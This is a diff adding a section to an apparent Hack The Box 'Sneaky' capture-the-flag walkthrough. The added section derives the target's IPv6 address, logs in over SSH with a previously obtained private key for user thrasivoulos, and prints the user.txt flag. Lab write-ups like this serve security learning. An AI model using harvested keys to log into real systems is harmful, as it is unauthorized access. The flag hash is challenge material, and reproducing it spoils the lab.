@@ -121,10 +121,53 @@ A wise gentelman from stack overflow helped us
 A little bit or "Trying Harder" and knowing that our local prefix should be dead:beef we get something like this
 
 ```
-dead:beef::250:56ff:feaa:815e (HAVE TO CHECK THIS)
+dead:beef::250:56ff:feaa:35f3 (HAVE TO CHECK THIS)
 ```
 
 lets try and connect to it via ssh and out key
+
+```
+root@kali:~/Hackthebox/Sneaky# ssh -6 dead:beef::250:56ff:feaa:35f3
+The authenticity of host 'dead:beef::250:56ff:feaa:35f3 (dead:beef::250:56ff:feaa:35f3)' can't be established.
+ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
+Are you sure you want to continue connecting (yes/no)? 
+```
+
+Say Whaaaaat!!!!
+
+Time to get rocking
+
+We have the key, the username is thrasivoulos , lets connect
+
+```
+root@kali:~/Hackthebox/Sneaky# ssh -6 -i adminssh.key thrasivoulos@dead:beef::250:56ff:feaa:35f3
+Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Nov  7 14:33:29 EET 2017
+
+  System load:  0.0               Processes:           181
+  Usage of /:   9.8% of 18.58GB   Users logged in:     1
+  Memory usage: 23%               IP address for eth0: 10.10.10.20
+  Swap usage:   0%
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Your Hardware Enablement Stack (HWE) is supported until April 2019.
+Last login: Tue Nov  7 14:33:30 2017 from dead:beef:2::1032
+thrasivoulos@Sneaky:~$ 
+
+```
+
+**user.txt**
+```
+thrasivoulos@Sneaky:~$ cat user.txt
+9fe14f76222db23a770f20136751bdab
+```
+
+_Mission: Root_
 
 
 
